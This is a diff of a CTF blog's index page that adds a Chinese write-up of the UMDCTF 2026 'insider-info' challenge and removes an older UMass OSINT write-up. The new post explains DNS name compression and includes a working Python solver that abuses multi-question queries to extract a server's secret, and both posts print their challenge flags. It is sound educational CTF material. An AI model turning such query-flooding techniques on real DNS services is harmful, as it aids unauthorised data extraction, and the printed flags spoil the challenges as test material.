@@ -235,7 +235,7 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">332</span>
+          <span class="site-state-item-count">333</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -376,6 +376,273 @@ p.spoiler {
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/umdctf2026/umdctf2026-insider-info/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/umdctf2026/umdctf2026-insider-info/" class="post-title-link" itemprop="url">UMDCTF 2026 - insider-info</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-04-26 10:00:00" itemprop="dateCreated datePublished" datetime="2026-04-26T10:00:00+08:00">2026-04-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-05-24 09:11:09" itemprop="dateModified" datetime="2026-05-24T09:11:09+08:00">2026-05-24</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/umdctf2026/umdctf2026-insider-info/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/umdctf2026/umdctf2026-insider-info/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p>A mysterious DNS server is running on the inside. It holds a secret —
+but you'll need to be clever to extract it all.</p>
+<p><strong>Hint:</strong> Can you ask more than one question at a
+time?</p>
+</blockquote>
+<h2 id="dns-基础">DNS 基础</h2>
+<h4 id="dns-消息长什么样">1. DNS 消息长什么样</h4>
+<p>DNS 消息在网络上是二进制数据，分五段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+------------------------+</span><br><span class="line">| Header (12 字节)       |  ← 消息头</span><br><span class="line">+------------------------+</span><br><span class="line">| Question (问题区)       |  ← 你问的是哪个域名</span><br><span class="line">+------------------------+</span><br><span class="line">| Answer (回答区)         |</span><br><span class="line">+------------------------+</span><br><span class="line">| Authority (权威区)      |</span><br><span class="line">+------------------------+</span><br><span class="line">| Additional (附加区)     |</span><br><span class="line">+------------------------+</span><br></pre></td></tr></table></figure>
+<p>Header 里最重要的四个字段是计数，告诉解析器每个区有多少条目：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">QDCOUNT — 问题区有几个问题</span><br><span class="line">ANCOUNT — 回答区有几个回答</span><br><span class="line">NSCOUNT — 权威区有几个记录</span><br><span class="line">ARCOUNT — 附加区有几个记录</span><br></pre></td></tr></table></figure>
+<p>一般情况下 QDCOUNT=1，每次只问一个问题。</p>
+<h4 id="域名在消息里不是字符串">2. 域名在消息里不是字符串</h4>
+<p>域名不是直接写 <code>www.example.com</code>。它按 <code>.</code>
+拆成标签（labels），每个标签前加 1 字节长度：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www.example.com 编码为：</span><br><span class="line">[3] &#x27;w&#x27; &#x27;w&#x27; &#x27;w&#x27;  [7] &#x27;e&#x27; &#x27;x&#x27; &#x27;a&#x27; &#x27;m&#x27; &#x27;p&#x27; &#x27;l&#x27; &#x27;e&#x27;  [3] &#x27;c&#x27; &#x27;o&#x27; &#x27;m&#x27;  [0]</span><br><span class="line">  ↑3字节          ↑7字节                 ↑3字节              ↑结束符</span><br></pre></td></tr></table></figure>
+<p>记这个编码方式，后面解压缩要用到。</p>
+<h4 id="dns-名称压缩核心机制">3. DNS 名称压缩——核心机制</h4>
+<p>同一个域名后缀会在一个消息里反复出现（问题区一个、回答区可能好几个）。每次都完整编码很浪费空间。</p>
+<p><strong>解决方案：用 2 字节的指针代替重复标签。</strong></p>
+<p>指针怎么和标签区分？标签长度字节的<strong>高 2
+位</strong>是标识位：</p>
+<table>
+<thead>
+<tr>
+<th>高 2 位</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>00</td>
+<td>普通标签（长度 0-63）</td>
+</tr>
+<tr>
+<td>11</td>
+<td><strong>压缩指针</strong></td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>普通标签最长 63 字节，二进制 <code>00111111</code>，高两位永远
+<code>00</code>。所以用 <code>11</code> 做指针标识不会混淆。</p>
+</blockquote>
+<p>指针格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> 1  1 | 14-bit OFFSET</span><br><span class="line">+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+</span><br><span class="line">| 1  1|         OFFSET                            |</span><br><span class="line">+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+</span><br></pre></td></tr></table></figure>
+<p>高 2 位 = <code>11</code> → 第一字节 ≥ 192 (0xC0) 低 14 位 =
+从消息开头算起的偏移量</p>
+<p><strong>举例</strong>：<code>0xC0 0x0C</code> - <code>0xC0</code> =
+<code>11000000</code> → 是指针 - 低 14 位 = 12 → 指向消息偏移 12
+的位置</p>
+<p><strong>域名可以部分用标签、部分用指针拼接</strong>：</p>
+<p><code>FOO.example.com</code> 如果 <code>.example.com</code>
+已经在前面出现过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[3] &#x27;F&#x27; &#x27;O&#x27; &#x27;O&#x27;  +  [指针指向.example.com的位置]</span><br><span class="line">    ↑新标签          ↑复用的是后面的所有标签</span><br></pre></td></tr></table></figure>
+<p>甚至可以<strong>整个域名只用一个指针</strong>指向之前出现过的相同域名。</p>
+<h4 id="一个消息可以问多个问题吗">4. 一个消息可以问多个问题吗？</h4>
+<p>可以。QDCOUNT 字段可以大于 1。</p>
+<p>不过传统 DNS 服务器通常不支持（RFC 9619
+甚至禁止了），但<strong>自定义 DNS
+服务器</strong>可以自己处理。这题的服务端就支持。</p>
+<h4 id="tcp-也能跑-dns">5. TCP 也能跑 DNS</h4>
+<p>常规 DNS 用 UDP 端口 53，但 TCP 也行。</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>UDP</th>
+<th>TCP</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>消息前缀</td>
+<td>无</td>
+<td><strong>2 字节长度</strong>（大端）+ 消息体</td>
+</tr>
+<tr>
+<td>大小限制</td>
+<td>512 字节传统上限</td>
+<td>无实际限制</td>
+</tr>
+<tr>
+<td>使用场景</td>
+<td>普通查询</td>
+<td>大响应、zone transfer</td>
+</tr>
+</tbody>
+</table>
+<p>TCP 传输时：先发 2 字节告诉我们接下来有多少字节的 DNS
+消息，再发消息体。</p>
+<hr />
+<h3 id="challenge-overview">Challenge Overview</h3>
+<p>题目给了一个自定义 DNS 服务器（监听 TCP），每次连接生成一个
+<strong>819 字符的随机 secret</strong>。</p>
+<p>服务器接受两种 TXT 记录查询：</p>
+<ol type="1">
+<li><strong>单字符查询</strong>：查
+<code>&lt;N&gt;.inside.info</code>（N 是 0~818）→ 返回第 N 位的字符</li>
+<li><strong>完整 secret 查询</strong>：查
+<code>完整secret(用点分63字符块).inside.info</code> → 返回 flag</li>
+</ol>
+<p>限制：<strong>每个连接只能发 2 次 DNS 查询</strong>，新连接生成全新
+secret。</p>
+<h3 id="分析">分析</h3>
+<p>要拿到 819 个字符，但只许问 2
+次。意味着第一次查询要<strong>一次性提取全部字符</strong>。</p>
+<p>每次查一个（<code>0.inside.info</code> → 拿字符
+0，<code>1.inside.info</code> → 拿字符
+1...）如果每个都单独发一次查询，需要 819 次，显然不行。</p>
+<h3 id="思路">思路</h3>
+<p>利用 <strong>QDCOUNT &gt; 1</strong>，把 819 个问题全塞进一个 DNS
+消息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">一条消息里：</span><br><span class="line">  Question 0: 0.inside.info → TXT</span><br><span class="line">  Question 1: 1.inside.info → TXT</span><br><span class="line">  ...</span><br><span class="line">  Question 818: 818.inside.info → TXT</span><br></pre></td></tr></table></figure>
+<p>服务端收到 QDCOUNT=819，逐个回答，一次返回 819 个字符。</p>
+<p>如果不压缩，每个 question： - <code>0.inside.info</code> 的域名编码 ≈
+16 字节 - QTYPE(2) + QCLASS(2) = 4 字节 - 共 ≈ 20 字节</p>
+<p>819 × 20 = 16,380 字节 → 太大了。</p>
+<p>819 个 question 共享同一个后缀
+<strong><code>.inside.info</code></strong>。</p>
+<p>把 <code>.inside.info</code>
+的完整标签编码放在消息<strong>末尾</strong>，每个 question 用<strong>2
+字节指针</strong>指向它：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">未压缩的 0.inside.info：</span><br><span class="line">  [1] &#x27;0&#x27;  [6] &#x27;i&#x27; &#x27;n&#x27; &#x27;s&#x27; &#x27;i&#x27; &#x27;d&#x27; &#x27;e&#x27;  [4] &#x27;i&#x27; &#x27;n&#x27; &#x27;f&#x27; &#x27;o&#x27;  [0]</span><br><span class="line">                                            ↑每次都重复这堆</span><br><span class="line"></span><br><span class="line">压缩后的 0.inside.info：</span><br><span class="line">  [1] &#x27;0&#x27;  +  [2字节指针 → .inside.info]  +  [QTYPE][QCLASS]</span><br><span class="line">   ↑只编数字     ↑指向消息末尾的共享后缀       ↑4字节</span><br></pre></td></tr></table></figure>
+<p>每个 question 从 ~20 字节压缩到 <strong>~7 字节</strong>。</p>
+<p>819 × 7 ≈ 5,700 字节，TCP 消息完全装得下。</p>
+<h3 id="攻击流程">攻击流程</h3>
+<p><strong>Query 1</strong> — 塞入 819 个压缩 question：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Header: QDCOUNT=819</span><br><span class="line">Question 0: [1]&#x27;0&#x27; + [指针→.inside.info] + TXT/IN</span><br><span class="line">Question 1: [1]&#x27;1&#x27; + [指针→.inside.info] + TXT/IN</span><br><span class="line">...</span><br><span class="line">Question 818: [3]&#x27;818&#x27; + [指针→.inside.info] + TXT/IN</span><br><span class="line">[消息末尾]: 完整的 .inside.info 标签编码 ← 指针指向这里</span><br></pre></td></tr></table></figure>
+<p>服务器回复 819 条 TXT 记录，每条一个字符。拼接出完整 secret。</p>
+<p><strong>Query 2</strong> — 查 <code>完整secret.inside.info</code> →
+拿到 flag。</p>
+<h3 id="exploit-code">Exploit Code</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_compressed_question</span>(<span class="params">num_bytes, suffix_offset</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;构造一个压缩 question: [数字标签] + [2字节指针→后缀] + [QTYPE][QCLASS]&quot;&quot;&quot;</span></span><br><span class="line">    buf = <span class="built_in">bytes</span>([<span class="built_in">len</span>(num_bytes)]) + num_bytes           <span class="comment"># 标签：长度 + 内容</span></span><br><span class="line">    buf += struct.pack(<span class="string">&#x27;!H&#x27;</span>, <span class="number">0xC000</span> | suffix_offset)    <span class="comment"># 指针：指向共享后缀</span></span><br><span class="line">    buf += struct.pack(<span class="string">&#x27;!HH&#x27;</span>, <span class="number">16</span>, <span class="number">1</span>)                    <span class="comment"># QTYPE=TXT, QCLASS=IN</span></span><br><span class="line">    <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_dns_name</span>(<span class="params">data, pos</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;跳过 DNS 域名（可能含压缩指针），返回下一个字段的起始位置&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> pos &lt; <span class="built_in">len</span>(data):</span><br><span class="line">        b = data[pos]</span><br><span class="line">        <span class="keyword">if</span> b == <span class="number">0</span>:          <span class="comment"># 结束符</span></span><br><span class="line">            <span class="keyword">return</span> pos + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (b &amp; <span class="number">0xC0</span>) == <span class="number">0xC0</span>:  <span class="comment"># 压缩指针，占 2 字节</span></span><br><span class="line">            <span class="keyword">return</span> pos + <span class="number">2</span></span><br><span class="line">        pos += <span class="number">1</span> + b        <span class="comment"># 普通标签：1字节长度 + N字节内容</span></span><br><span class="line">    <span class="keyword">return</span> pos</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Query 1: 提取全部 819 个字符 ---</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 先构建所有 question（用占位偏移 0）</span></span><br><span class="line">questions_placeholder = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">819</span>):</span><br><span class="line">    num = <span class="built_in">str</span>(i).encode()</span><br><span class="line">    questions_placeholder += build_compressed_question(num, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算共享后缀 .inside.info 的偏移位置（在 question 区之后）</span></span><br><span class="line">suffix_offset = <span class="number">12</span> + <span class="built_in">len</span>(questions_placeholder)</span><br><span class="line">suffix_encoding = <span class="string">b&#x27;\x06inside\x04info\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用真实偏移重新构建 question</span></span><br><span class="line">questions = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">819</span>):</span><br><span class="line">    num = <span class="built_in">str</span>(i).encode()</span><br><span class="line">    questions += build_compressed_question(num, suffix_offset)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把后缀编码追加到末尾</span></span><br><span class="line">questions += suffix_encoding</span><br><span class="line"></span><br><span class="line"><span class="comment"># 组装 DNS 消息</span></span><br><span class="line">dns_header = struct.pack(<span class="string">&#x27;!HHHHHH&#x27;</span>, <span class="number">0x1337</span>, <span class="number">0x0100</span>, <span class="number">819</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">packet = dns_header + questions</span><br><span class="line"></span><br><span class="line"><span class="comment"># TCP 发送（2 字节长度前缀）</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.connect((<span class="string">&#x27;challenge.umdctf.io&#x27;</span>, <span class="number">31337</span>))</span><br><span class="line">sock.send(struct.pack(<span class="string">&#x27;!H&#x27;</span>, <span class="built_in">len</span>(packet)) + packet)</span><br><span class="line"></span><br><span class="line"><span class="comment"># TCP 接收（先读 2 字节长度，再读取消息体）</span></span><br><span class="line">resp_len = struct.unpack(<span class="string">&#x27;!H&#x27;</span>, sock.recv(<span class="number">2</span>))[<span class="number">0</span>]</span><br><span class="line">resp = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(resp) &lt; resp_len:</span><br><span class="line">    chunk = sock.recv(resp_len - <span class="built_in">len</span>(resp))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    resp += chunk</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从响应中解析 819 个 TXT 记录，提取每个字符</span></span><br><span class="line">pos = <span class="number">12</span>  <span class="comment"># 跳过 DNS header</span></span><br><span class="line"><span class="comment"># 跳过 question 区（服务端在响应里回显了所有 question）</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">819</span>):</span><br><span class="line">    pos = read_dns_name(resp, pos)</span><br><span class="line">    pos += <span class="number">4</span>  <span class="comment"># QTYPE + QCLASS</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析 answer 区</span></span><br><span class="line">secret_chars = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">819</span>):</span><br><span class="line">    pos = read_dns_name(resp, pos)  <span class="comment"># NAME</span></span><br><span class="line">    rtype, rclass, ttl, rdlen = struct.unpack(<span class="string">&#x27;!HHIH&#x27;</span>, resp[pos:pos+<span class="number">10</span>])</span><br><span class="line">    pos += <span class="number">10</span></span><br><span class="line">    <span class="keyword">if</span> rtype == <span class="number">16</span>:  <span class="comment"># TXT 记录</span></span><br><span class="line">        txt_len = resp[pos]          <span class="comment"># TXT 的第一个字节是字符串长度</span></span><br><span class="line">        char = resp[pos+<span class="number">1</span>:pos+<span class="number">1</span>+txt_len].decode()</span><br><span class="line">        secret_chars.append(char)</span><br><span class="line">    pos += rdlen</span><br><span class="line"></span><br><span class="line">secret = <span class="string">&#x27;&#x27;</span>.join(secret_chars)</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Query 2: 拿 flag ---</span></span><br><span class="line"><span class="comment"># secret 分成 63 字符的块（DNS 标签长度上限）</span></span><br><span class="line">chunks = [secret[i:i+<span class="number">63</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(secret), <span class="number">63</span>)]</span><br><span class="line">full_name = <span class="string">&#x27;.&#x27;</span>.join(chunks) + <span class="string">&#x27;.inside.info&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 编码完整域名 + question</span></span><br><span class="line">qname = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> part <span class="keyword">in</span> full_name.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">    qname += <span class="built_in">bytes</span>([<span class="built_in">len</span>(part)]) + part.encode()</span><br><span class="line">qname += <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">flag_question = qname + struct.pack(<span class="string">&#x27;!HH&#x27;</span>, <span class="number">16</span>, <span class="number">1</span>)</span><br><span class="line">flag_header = struct.pack(<span class="string">&#x27;!HHHHHH&#x27;</span>, <span class="number">0x1338</span>, <span class="number">0x0100</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">flag_packet = flag_header + flag_question</span><br><span class="line"></span><br><span class="line">sock.send(struct.pack(<span class="string">&#x27;!H&#x27;</span>, <span class="built_in">len</span>(flag_packet)) + flag_packet)</span><br><span class="line"><span class="comment"># 解析 flag... （与上面类似的 TXT 解析逻辑）</span></span><br><span class="line">sock.close()</span><br></pre></td></tr></table></figure>
+<h3 id="关键点总结">关键点总结</h3>
+<table>
+<colgroup>
+<col style="width: 27%" />
+<col style="width: 72%" />
+</colgroup>
+<thead>
+<tr>
+<th>概念</th>
+<th>在这道题里的作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>QDCOUNT &gt; 1</strong></td>
+<td>一个消息塞 819 个问题，一次拿到全部字符</td>
+</tr>
+<tr>
+<td><strong>名称压缩（指针）</strong></td>
+<td>每个 question 共享 <code>.inside.info</code> 后缀，大小从 20
+字节降到 7 字节</td>
+</tr>
+<tr>
+<td><strong>TCP 传输</strong></td>
+<td>消息太大放不进 UDP，用 TCP 的 2 字节长度前缀可靠传输</td>
+</tr>
+<tr>
+<td><strong>TXT 记录</strong></td>
+<td>服务器用 TXT 返回单字符，1 字节长度前缀 + 1 字节字符</td>
+</tr>
+</tbody>
+</table>
+<h3 id="flag">Flag</h3>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">UMDCTF{5Ur31Y_N0_0N3_W111_N071C3_MY_1N51D3r_7r4D1N6}</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1709,124 +1976,6 @@ up the animation for Jedi and Sith characters using the Force on
 objects.</p>
 <h3 id="flag">Flag</h3>
 <span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">UMASS{Fast_Force}</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/umass2026/umassctf2026-high-performance/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/umass2026/umassctf2026-high-performance/" class="post-title-link" itemprop="url">UMass CTF 2026 - High Performance</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-04-13 14:06:19 / Modified: 14:13:24" itemprop="dateCreated datePublished" datetime="2026-04-13T14:06:19+08:00">2026-04-13</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/umass2026/umassctf2026-high-performance/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/umass2026/umassctf2026-high-performance/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>I've heard there's a computer shop in the area that sells a computer
-that isn't designed to run Windows, macOS, or Linux. What's the
-processor that's in their flagship, PCIe-capable system? Flag format:
-UMASS{Name of Processor}, i.e. UMASS{AMD Ryzen 7 9800X3D}</p>
-</blockquote>
-<h3 id="initial-analysis">Initial Analysis</h3>
-<p>This OSINT challenge asks for the processor of a flagship,
-PCIe-capable computer system sold by a shop that specializes in hardware
-not intended for mainstream operating systems like Windows, macOS, or
-Linux.</p>
-<p>Key clues: - Non-mainstream OS (Windows, macOS, Linux excluded). -
-Flagship, PCIe-capable system. - Computer shop in a specific "area"
-(implied by the context of previous challenges or search).</p>
-<h3 id="solution">Solution</h3>
-<p>Locate Luxembourg Frence first through picture.</p>
-<p>By researching specialized computer shops, we identified <strong>AAA
-Technology Sàrl</strong> in Dudelange, Luxembourg. They are well-known
-for selling <strong>Amiga</strong> compatible hardware, which runs
-AmigaOS rather than Windows or Linux.</p>
-<p>Their flagship PCIe-capable system is the <strong>AmigaOne</strong>
-series. Investigation into the technical specifications of their
-flagship systems and Amiga platform revealed that the processor used is
-the <strong>NXP QorIQ P1022</strong>.</p>
-<h3 id="flag">Flag</h3>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">UMASS{NXP QorIQ P1022}</span></span>
 
       
     </div>
